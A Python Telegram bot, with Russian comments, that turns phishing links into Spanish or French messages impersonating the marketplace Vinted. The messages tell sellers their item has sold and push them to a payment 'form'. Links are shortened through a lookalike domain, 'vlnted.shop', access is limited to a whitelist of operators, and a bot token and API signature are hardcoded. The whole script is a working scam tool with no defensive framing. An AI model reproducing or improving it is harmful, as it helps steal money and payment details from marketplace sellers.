import logging
import telegram
import re
from telegram.ext import (
    Updater,
    CommandHandler,
    MessageHandler,
    Filters,
    CallbackQueryHandler,
)
from telegram import InlineKeyboardMarkup, InlineKeyboardButton
import requests

TOKEN = '6762845101:AAFycl3cDPrbveCUELVT5qe94oIcpb6rwcM'
shortened_urls = []
allowed_user_ids = ['6689901817', '1048039908', '6691449487','6828649649', '6727112006']
user_names = {
    '6689901817': 'Руслан',
    '6828649649': 'Миша',
    '6727112006': 'Паша'
}
# Инициализация логгера
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)
def start(update, context):
    user_id = update.effective_user.id
    buttons = [
        [
            InlineKeyboardButton("Язык", callback_data="language"),
            InlineKeyboardButton("Сократить ссылку", callback_data="short"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(buttons)
    context.bot.send_message(
        chat_id=user_id, text="Выберите команду:", reply_markup=reply_markup
    )
# Функция для проверки ссылки на валид
def validate_url(url):
    pattern = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:[\w-]+\.)*'  # sub-domains
        r'(?:[\w-]+)'  # domain name
        r'(?:\.[a-zA-Z]{2,63})?'  # dot and top-level domain
        r'(?:/[\w-]*)*'  # path
    )
    return re.match(pattern, url) is not None


# Функция для обработки команды /язык
def language(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    if str(user_id) not in allowed_user_ids:
        context.bot.answer_callback_query(
            callback_query_id=query.id, text="Извините, вы не имеете доступа.")
        return button_callback(update, context)
    buttons = [
        [
            InlineKeyboardButton("Испанский", callback_data="russian"),
            InlineKeyboardButton("Французский", callback_data="french"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(buttons)
    context.bot.edit_message_text(
        chat_id=user_id,
        message_id=query.message.message_id,
        text="Выберите язык:",
        reply_markup=reply_markup,
    )


# Функция для обработки команды /short
def shorten_url(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    if str(user_id) not in allowed_user_ids:
        context.bot.answer_callback_query(
            callback_query_id=query.id, text="Извините, вы не имеете доступа.")
        return button_callback(update, context)
    context.bot.send_photo(
        chat_id=user_id,
        photo="https://sun9-60.userapi.com/impg/ppK7P7hG18lYlLIqsd9Sus6UYFJ0lFqKx0jOcQ/JENIeG2glzM.jpg?size=426x116&quality=96&sign=2352b7c085e805fc51d7fec2be5043d1&type=album",
        caption="Введите ссылки для сокращения (каждая ссылка с новой строки): "
    )


# Функция для сохранения выбранного языка в файл или обновления языка для существующего пользователя
def save_language(user_id, language):
    updated = False
    with open("language.txt", "r+", encoding='cp1251') as file:
        lines = file.readlines()
        file.seek(0)
        for line in lines:
            if line.startswith(str(user_id)):
                file.write(f"{user_id}:{language}\n")
                updated = True
            else:
                file.write(line)
        if not updated:
            file.write(f"{user_id}:{language}\n")
        file.truncate()


# Функция для получения выбранного языка из файла
def get_language(user_id):
    with open("language.txt", "r", encoding='cp1251') as file:
        for line in file:
            if line.startswith(str(user_id)):
                return line.strip().split(":")[1]
    # Если нет записи для пользователя, возвращаем русский язык по умолчанию
    return "русский"


# Функция для сокращения ссылки
def shorten_link(original_url):

    url = "http://vlnted.shop/yourls-api.php"
    params = {
        "signature": "f4e86197fc",
        "action": "shorturl",
        "url": original_url,
    }

    response = requests.get(url, params=params)
    data = response.text

    start_index = data.find("<shorturl>") + len("<shorturl>")
    end_index = data.find("</shorturl>")

    short_url = data[start_index:end_index]




    return short_url



# Обработчик нажатий на кнопки
def button_callback(update, context):
    query = update.callback_query
    user_id = query.from_user.id

    if query.data == "language":
        language(update, context)
    elif query.data == "short":
        shorten_url(update, context)
    elif str(user_id) not in allowed_user_ids:
        context.bot.answer_callback_query(
            callback_query_id=query.id, text="Извините, вы не имеете доступа.")
        return button_callback(update, context)

    elif query.data == "russian":
        save_language(user_id, "русский")
        context.bot.answer_callback_query(
            callback_query_id=query.id, text="Выбран язык: испанский"
        )
        context.bot.delete_message(chat_id=user_id, message_id=query.message.message_id)
        return start(update, context)
    elif query.data == "french":
        save_language(user_id, "французский")
        context.bot.answer_callback_query(
            callback_query_id=query.id, text="Выбран язык: французский"

        )
        context.bot.delete_message(chat_id=user_id, message_id=query.message.message_id)
        return start(update, context)


# Функция для обработки входящих сообщений
def handle_message(update, context):

    user_id = update.effective_user.id
    user_id = str(update.effective_user.id)
    user_name = user_names.get(user_id, 'Незнакомец')  # Получаем имя пользователя из словаря

    # Записываем информацию о пользователе (имя) в лог
    logger.info(f'Отправитель сообщения: {user_name}')
    language = get_language(user_id)
    lines = update.message.text.strip().split("\n")

    for line in lines:

        if validate_url(line):


            for line in lines:
                short_url = shorten_link(line)
                if language == 'русский':
                    context.bot.send_message(chat_id=user_id, text=f'''Hola ✋

📣 Vinted te informa que tu artículo ha sido comprado por el usuario.

💌 El usuario ha realizado el pago de este producto y la entrega a domicilio por mensajería.

📲 Por favor sigue el enlace al formulario: {short_url}

✏️ Pasos a seguir para recibir el pago de un artículo:

Completa la información solicitada en el formulario. Una vez confirmada la venta, recibirás instrucciones de un representante de soporte. Ellos le guiarán a través de los pasos necesarios para recibir su pago. Haga clic en el enlace anterior ⤴️ para completar el formulario.

Vinted💚 le desea mucho éxito con su venta.
''')
                elif language == 'французский':
                    context.bot.send_message(chat_id=user_id, text=f'''Bonjour ✋

📣 Vinted vous informe que votre article a été acheté par l'utilisateur.

💌 L'utilisateur a effectué le paiement pour ce produit et la livraison à domicile par coursier.

📲 Veuillez suivre le lien vers le formulaire : {short_url}

✏️ Étapes à suivre pour recevoir le paiement d'un article :

Complétez les informations requises sur le formulaire. Une fois la vente confirmée, vous recevrez des instructions d'un représentant de l'assistance. Ce dernier vous guidera à travers les étapes nécessaires pour recevoir votre paiement. Cliquez sur le lien ci-dessus ⤴️ pour compléter le formulaire.

Vinted💚 vous souhaite beaucoup de succès dans votre vente!
''')


        else:
            context.bot.send_message(chat_id=user_id, text="Некорректная ссылка")
            return start(update, context)

        




def main():
    # Инициализация бота и создание паттернов команд
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher


    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dp.add_handler(CallbackQueryHandler(button_callback))


    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
